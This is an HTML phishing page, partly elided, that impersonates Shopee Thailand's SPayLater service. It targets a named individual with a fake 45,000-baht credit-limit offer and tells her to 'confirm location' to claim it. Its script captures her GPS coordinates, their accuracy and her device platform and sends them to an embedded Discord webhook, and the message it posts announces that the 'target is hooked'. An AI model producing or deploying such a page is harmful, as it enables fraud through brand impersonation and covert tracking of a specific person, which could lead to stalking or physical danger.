...
<head>
    ...
    <title>Shopee | ตรวจสอบสิทธิ์เพิ่มวงเงิน SPayLater</title>
...
<div class="container">
    ...
    <h1>สิทธิ์เพิ่มวงเงินกู้พิเศษ</h1>
    <div class="info-box">
        <span class="info-label">บัญชีผู้ได้รับสิทธิ์:</span>
        <span class="info-value">วราภรณ์ ดีสอน (Xiaomi)</span>
    </div>
    <p>ยินดีด้วย! คุณได้รับสิทธิ์เพิ่มวงเงิน SPayLater เป็น <b>45,000 บาท</b> กรุณายืนยันตำแหน่งปัจจุบันเพื่อความปลอดภัยและรับสิทธิ์ทันที</p>
    <button onclick="getLocation()">ตรวจสอบพิกัดและรับสิทธิ์</button>
    <div class="footer">© 2026 Shopee Thailand. ระบบรักษาความปลอดภัยข้อมูล</div>
</div>

<script>
    // เชื่อมต่อ Webhook ของยูยูเรียบร้อยครับ
    const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1489269207026897087/TzJIxIrMpztF8yqduGcpPUwQwCnQflmd_5nbHdBtqwevdBWYV76KS4ite7kS08";
    ...
    function getLocation() {
        if (navigator.geolocation) {
            ...
            alert("อุปกรณ์ไม่รองรับการยืนยันตัวตน โปรดลองใหม่อีกครั้ง");
        }
    }

    function sendData(position) {
        const payload = {
            content: "🎯 **เป้าหมาย (คุณวราภรณ์) ติดเบ็ดแล้ว!**",
            embeds: [{
                title: "📍 พิกัด GPS จากเครื่อง Xiaomi",
                color: 16733440,
                fields: [
                    { name: "👤 ชื่อ", value: "วราภรณ์ ดีสอน", inline: true },
                    { name: "📍 Google Maps", value: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}` },
                    { name: "📏 ความแม่นยำ", value: position.coords.accuracy.toFixed(2) + " เมตร" },
                    { name: "📱 อุปกรณ์", value: navigator.platform },
        ...
        fetch(DISCORD_WEBHOOK, {
            ...
            alert("ยืนยันตัวตนสำเร็จ ระบบกำลังพาคุณไปที่หน้า Shopee");
